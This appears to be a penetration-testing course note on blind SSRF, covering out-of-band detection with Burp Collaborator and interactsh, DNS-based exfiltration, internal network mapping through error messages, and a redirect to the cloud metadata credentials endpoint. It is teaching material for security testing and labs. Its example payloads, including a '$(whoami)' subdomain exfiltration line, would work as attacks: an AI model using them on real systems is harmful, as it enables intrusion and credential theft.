---
tags: [vapt, ssrf, intermediate]
difficulty: intermediate
module: "13 - SSRF"
topic: "13.07 Blind SSRF (Burp Collaborator / interactsh)"
portswigger_labs: ["Blind SSRF with out-of-band detection", "Blind SSRF with out-of-band data exfiltration"]
---

# 13.07 — Blind SSRF

## What is Blind SSRF?

```
BLIND SSRF:
  Server makes the request you specified...
  BUT returns no response content to you!
  
  Examples:
  - Webhook handler (fires HTTP request, returns "OK" not the response)
  - Async URL processor (queues request, no sync response)
  - PDF generator that stores file (no preview)
  - Analytics ping that logs URL visits
  - "Test connection" that returns pass/fail only
  
  HOW TO DETECT:
  Use Out-of-Band techniques:
  Server makes request → your attacker-controlled endpoint receives it!
  Even if you can't see the response → you know SSRF works!
```

---

## Burp Collaborator Method

```
BURP COLLABORATOR:
  Burp provides a unique domain: randomid.burpcollaborator.net
  Any DNS lookup or HTTP request to that domain → Burp logs it!
  
STEPS:
  1. Burp Pro → Burp menu → Burp Collaborator Client
  2. Click "Copy to clipboard" → get your unique payload URL
     Example: https://xxxx.burpcollaborator.net
  3. Use in SSRF test:
     url=http://xxxx.burpcollaborator.net
  4. Submit the request
  5. In Collaborator client → click "Poll now"
  6. If you see DNS or HTTP interactions → BLIND SSRF CONFIRMED!
  
COLLABORATOR PAYLOAD VARIATIONS:
  http://xxxx.burpcollaborator.net
  https://xxxx.burpcollaborator.net
  //xxxx.burpcollaborator.net  (protocol-relative URL)
  http://xxxx.burpcollaborator.net/path
  http://user:pass@xxxx.burpcollaborator.net/
```

---

## Interactsh (Free Alternative to Burp Collaborator)

```bash
# INTERACTSH SETUP:

# OPTION 1: Use public instance (oast.pro):
# Visit: https://app.interactsh.com → get unique URL:
# https://UNIQUE_ID.oast.pro

# OPTION 2: Self-hosted with Docker:
docker run -it projectdiscovery/interactsh-server

# OPTION 3: CLI client:
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client  # outputs unique URL, polls for callbacks

# USAGE:
# Get URL: https://ABCDEF.oast.pro
# Use in SSRF: url=http://ABCDEF.oast.pro/
# App fetches → interactsh.com logs the hit
# Check dashboard or CLI for received interaction

# PIPELINE WITH NUCLEI:
cat urls.txt | nuclei -t ssrf/ -c 50
# nuclei uses interactsh automatically for OOB checks
```

---

## Detecting Blind SSRF via DNS

```
DNS-BASED DETECTION:
  Even if HTTP is blocked → DNS lookup often still works!
  
  ATTACK:
  url=http://test.xxxx.burpcollaborator.net/
  
  Even if firewall blocks outbound HTTP:
  1. Server resolves DNS: test.xxxx.burpcollaborator.net
  2. DNS query hits Burp Collaborator's DNS server!
  3. Burp logs: "DNS interaction from target IP"
  4. BLIND SSRF CONFIRMED via DNS!
  
  More covert than HTTP (firewalls often allow DNS out)
  
SUBDOMAIN DATA EXFILTRATION:
  Use subdomain as data channel!
  url=http://EXFILTRATED_DATA.xxxx.burpcollaborator.net/
  
  If app puts data in URL: url=http://$(whoami).xxxx.collab.net/
  → DNS lookup: {command_output}.xxxx.collab.net
  → Exfiltrate one piece of data per DNS lookup!
```

---

## Semi-Blind SSRF via Error Messages

```
SOMETIMES APP REVEALS INFO IN ERRORS:
  
  url=http://169.254.169.254/            → timeout (filtered)
  url=http://192.168.1.1/               → "Connection refused" (host exists!)
  url=http://192.168.1.1:8080/          → "Connection refused" (port closed)
  url=http://192.168.1.1:80/            → HTML content! (SSRF!)
  
  "Connection refused" = host is alive but port closed!
  "Connection timed out" = host not alive or filtered!
  "HTTP 200" = SSRF!
  "Invalid host" = DNS resolution failed
  
  USE THIS TO MAP INTERNAL NETWORK:
  Scan 10.0.0.1 to 10.0.0.254:
  → "Connection refused" = alive
  → timeout = dead
  → Draw internal network map!
```

---

## Blind SSRF to Data Exfil (Advanced)

```bash
# STEP 1: CONFIRM BLIND SSRF VIA COLLABORATOR:
url=http://YOUR_COLLABORATOR_PAYLOAD.burpcollaborator.net/

# STEP 2: CHECK IF RESPONSE IS FOLLOWED (redirect test):
# Host this on your server:
# HTTP/1.1 302 Found
# Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/

# STEP 3: USE GOPHER FOR DATA EXFIL:
# Some apps follow redirects from SSRF
# Host redirect pointing to metadata endpoint

# STEP 4: DNS EXFIL:
# For each piece of data, encode in subdomain:
# IAM_ROLE_NAME.YOUR_COLLABORATOR.burpcollaborator.net
# → Burp receives DNS query → you see role name in DNS lookup!

# PRACTICAL TOOL: ssrfmap
# https://github.com/swisskyrepo/SSRFmap
python3 ssrfmap.py \
  -r request.txt \
  -p url \
  -m portscan \
  --collaborator YOUR_COLLABORATOR_URL
```

---

## Blind SSRF — Finding via "Collaborator Everywhere" Burp Extension

```
BURP EXTENSION: "Collaborator Everywhere" (by PortSwigger)

HOW IT WORKS:
  Automatically injects Burp Collaborator payloads into ALL headers:
  - Referer
  - X-Forwarded-For
  - X-Forwarded-Host
  - True-Client-IP
  - Origin
  - 20+ other headers
  
  For every request you make through Burp → extension adds headers
  with Collaborator payload.
  
  If any header causes the app to make a request → Collaborator logs it!
  
SETUP:
  1. Burp Pro → Extender → BApp Store → Install "Collaborator Everywhere"
  2. Browse the application normally
  3. Periodically check Collaborator client for interactions
  4. Interactions reveal which endpoints are vulnerable to blind SSRF via headers!
```

---

## Related Notes
- [[01 - What is SSRF]] — fundamentals
- [[02 - Basic SSRF Fetching Internal URLs]] — in-band SSRF
- [[08 - Semi-Blind SSRF Timing]] — timing attacks
- [[09 - SSRF Cloud Metadata AWS]] — blind SSRF to cloud credentials
- [[15 - SSRF DNS Rebinding]] — advanced evasion
